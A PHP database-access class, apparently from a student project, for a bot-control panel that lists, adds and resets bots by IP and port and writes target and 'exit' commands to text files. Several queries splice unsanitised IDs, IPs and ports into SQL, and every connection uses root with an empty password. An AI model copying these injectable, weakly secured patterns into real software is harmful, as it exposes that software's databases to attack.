<?php
include_once("../Model/Bean/Bot.php");
class DAO_Bot
{

    public function getAllBot()
    {
        $link = mysqli_connect("localhost", "root", "") or die("Khong the ket noi den CSDL MYSQL");
        mysqli_select_db($link, "pbl4_v2");
        $sql = "SELECT * FROM bot";
        $rs = mysqli_query($link, $sql);
        $Botes = array();
        $i = 0;
        while ($row = mysqli_fetch_array($rs)) {
            $Id = $row['Id'];
            $Ip = $row['Ip'];
            $Port = $row['Port'];
            $Status = $row['Status'];
            $Remove = $row['Remove'];
            $Botes[$i++] = new Bot($Id, $Ip, $Port, $Status, $Remove);
        }
        return $Botes;
    }
    public function getAllBotPage($page)
    {
        $link = mysqli_connect("localhost", "root", "") or die("Khong the ket noi den CSDL MYSQL");
        mysqli_select_db($link, "pbl4_v2");
        $sql = "SELECT * FROM bot ORDER BY Id ASC";
        $offset = $page * 15;
        $sql = $sql . " LIMIT 15 OFFSET " . $offset;
        $rs = mysqli_query($link, $sql);
        $Botes = array();
        $i = 0;
        while ($row = mysqli_fetch_array($rs)) {
            $Id = $row['Id'];
            $Ip = $row['Ip'];
            $Port = $row['Port'];
            $Status = $row['Status'];
            $Remove = $row['Remove'];
            $Botes[$i++] = new Bot($Id, $Ip, $Port, $Status, $Remove);
        }
        return $Botes;
    }
    public function getBotActive()
    {
        $link = mysqli_connect("localhost", "root", "") or die("Khong the ket noi den CSDL MYSQL");
        mysqli_select_db($link, "pbl4_v2");
        $sql = "SELECT * FROM bot WHERE Status = 1";
        $rs = mysqli_query($link, $sql);
        $Botes = array();
        $i = 0;
        while ($row = mysqli_fetch_array($rs)) {
            $Id = $row['Id'];
            $Ip = $row['Ip'];
            $Port = $row['Port'];
            $Status = $row['Status'];
            $Remove = $row['Remove'];
            $Botes[$i++] = new Bot($Id, $Ip, $Port, $Status, $Remove);
        }
        return $Botes;
    }
    public function getBotActivePage($page)
    {
        $link = mysqli_connect("localhost", "root", "") or die("Khong the ket noi den CSDL MYSQL");
        mysqli_select_db($link, "pbl4_v2");
        $sql = "SELECT * FROM bot WHERE Status = 1 ORDER BY Id ASC";
        $offset = $page * 15;
        $sql = $sql . " LIMIT 15 OFFSET " . $offset;
        $rs = mysqli_query($link, $sql);
        $Botes = array();
        $i = 0;
        while ($row = mysqli_fetch_array($rs)) {
            $Id = $row['Id'];
            $Ip = $row['Ip'];
            $Port = $row['Port'];
            $Status = $row['Status'];
            $Remove = $row['Remove'];
            $Botes[$i++] = new Bot($Id, $Ip, $Port, $Status, $Remove);
        }
        return $Botes;
    }
    public function getBotPassive()
    {
        $link = mysqli_connect("localhost", "root", "") or die("Khong the ket noi den CSDL MYSQL");
        mysqli_select_db($link, "pbl4_v2");
        $sql = "SELECT * FROM bot WHERE Status = 0";
        $rs = mysqli_query($link, $sql);
        $Botes = array();
        $i = 0;
        while ($row = mysqli_fetch_array($rs)) {
            $Id = $row['Id'];
            $Ip = $row['Ip'];
            $Port = $row['Port'];
            $Status = $row['Status'];
            $Remove = $row['Remove'];
            $Botes[$i++] = new Bot($Id, $Ip, $Port, $Status, $Remove);
        }
        return $Botes;
    }
    public function getBotPassivePage($page)
    {
        $link = mysqli_connect("localhost", "root", "") or die("Khong the ket noi den CSDL MYSQL");
        mysqli_select_db($link, "pbl4_v2");
        $sql = "SELECT * FROM bot WHERE Status = 0 ORDER BY Id ASC";
        $offset = $page * 15;
        $sql = $sql . " LIMIT 15 OFFSET " . $offset;
        $rs = mysqli_query($link, $sql);
        $Botes = array();
        $i = 0;
        while ($row = mysqli_fetch_array($rs)) {
            $Id = $row['Id'];
            $Ip = $row['Ip'];
            $Port = $row['Port'];
            $Status = $row['Status'];
            $Remove = $row['Remove'];
            $Botes[$i++] = new Bot($Id, $Ip, $Port, $Status, $Remove);
        }
        return $Botes;
    }
    public function controlOneBot($ID)
    {
        $link = mysqli_connect("localhost", "root", "") or die("Khong the ket noi den CSDL MYSQL");
        mysqli_select_db($link, "pbl4_v2");
        $sql = "SELECT * FROM bot WHERE Id='$ID'";
        $result = mysqli_query($link, $sql);
        while ($row = mysqli_fetch_array($result)) {
            $ip = $row['Ip'];
            $port = $row['Port'];
            $status = $row['Status'];
        }
        $fp = fopen('../txt/botActive.txt', 'w');
        fwrite($fp, $ID);
        fwrite($fp, '&');
        fwrite($fp, $ip);
        fwrite($fp, '&');
        fwrite($fp, $port);
        fclose($fp);
    }
    public function controlAllBot()
    {
        $fp = fopen('../txt/botActive.txt', 'w');
        fwrite($fp, "All");
        fwrite($fp, '&');
        fwrite($fp, "All");
        fwrite($fp, '&');
        fwrite($fp, "All");
        fclose($fp);
    }
    public function addBot($ip, $port)
    {
        $db = new mysqli('localhost', 'root', '', 'pbl4_v2');
        $check_exist_list_bot = 'SELECT * FROM bot where Ip="' . $ip . '" and Port=' . $port . ';';
        $rs_check_exist_list_bot = $db->query($check_exist_list_bot);
        if ($rs_check_exist_list_bot->num_rows > 0) {
            $query = '  UPDATE bot
                SET status = 1, remove = 0
                where Ip="' . $ip . '" and Port=' . $port . ';';
            $db->query($query);
        } else {
            $query = "INSERT INTO bot(Ip, Port, Status, Remove ) VALUES(?,?, 1, 0)";
            $stmt = $db->prepare($query);
            $stmt->bind_param('ss', $ip, $port);
            $stmt->execute();
        }
        $db->close();
    }
    public function resetBotStatus()
    {
        $db = new mysqli('localhost', 'root', '', 'pbl4_v2');
        $sql = "UPDATE bot SET Status = 0";
        $rs = mysqli_query($db, $sql);
    }
    public function resetBotStatusWithId($ID)
    {
        $db = new mysqli('localhost', 'root', '', 'pbl4_v2');
        $sql = "UPDATE bot
                SET Status = 0
                Where Id = " . $ID;
        $rs = mysqli_query($db, $sql);
    }
    public function getIdBot($ip, $port)
    {
        $db = new mysqli('localhost', 'root', '', 'pbl4_v2');
        $sql = "select * from bot where Ip = '" . $ip . "' and Port=" . $port;
        $rs = mysqli_query($db, $sql);
        while ($row = mysqli_fetch_array($rs)) {
            return $row['Id'];
        }
    }
    public function exitBot($id)
    {
        $db = new mysqli('localhost', 'root', '', 'pbl4_v2');
        $sql = "Select * from bot where Id = " . $id;
        $result = mysqli_query($db, $sql);
        $sqlUpdate = "UPDATE bot SET Status = 0 WHERE Id = " . $id;
        mysqli_query($db, $sqlUpdate);
        while ($row = mysqli_fetch_array($result)) {
            $ip = $row['Ip'];
            $port = $row['Port'];
        }
        $fp = fopen('../txt/botActive.txt', 'w');
        fwrite($fp, $id);
        fwrite($fp, '&');
        fwrite($fp, $ip);
        fwrite($fp, '&');
        fwrite($fp, $port);

        fclose($fp);
        $fp = fopen('../txt/commandBot.txt', 'w');
        fwrite($fp, "exit");
        fwrite($fp, '&');
        fwrite($fp, "stop");
        fclose($fp);
    }
}
